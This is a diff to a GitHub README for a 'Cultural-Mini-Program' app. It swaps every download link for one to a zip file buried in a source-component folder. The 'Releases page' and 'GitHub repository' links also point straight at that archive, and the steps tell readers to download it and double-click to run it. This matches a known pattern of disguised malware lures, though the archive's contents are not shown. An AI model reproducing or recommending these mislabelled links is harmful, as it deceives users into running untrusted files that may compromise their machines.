@@ -1,6 +1,6 @@
 # 🎉 Cultural-Mini-Program - Enhance Your Cultural Experience
 
-[![Download Cultural-Mini-Program](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip)](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip)
+[![Download Cultural-Mini-Program](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip)](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To get started with Cultural-Mini-Program, follow these simple steps. You don't 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip) to download the latest version of the app.
+1. Visit the [Releases page](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip) to download the latest version of the app.
 2. On the Releases page, look for the most recent release.
 3. Click on the available asset to download the installation file.
 4. Once the download is complete, locate the downloaded file and double-click to run it.
@@ -56,7 +56,7 @@ Once installed, open Cultural-Mini-Program. You will see a user-friendly interfa
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out to our support team. You can contact us by visiting the Issues section of our [GitHub repository](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip).
+If you encounter any issues or have questions, please reach out to our support team. You can contact us by visiting the Issues section of our [GitHub repository](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip).
 
 ## 📝 License
 
@@ -70,4 +70,4 @@ We welcome contributions! If you would like to help improve the Cultural-Mini-Pr
 
 Cultural-Mini-Program is your gateway to enriching cultural experiences. By following the steps above, you’ll be able to download and run the application smoothly. Enjoy your journey into the world of culture! 
 
-[![Download Cultural-Mini-Program](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip)](https://github.com/supratim1020/Cultural-Mini-Program/raw/refs/heads/main/src/assets/Cultural-Mini-Program-v1.5-beta.2.zip)
+[![Download Cultural-Mini-Program](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip)](https://raw.githubusercontent.com/supratim1020/Cultural-Mini-Program/main/src/components/echart/center/centerChartRate/Program-Cultural-Mini-3.5.zip)
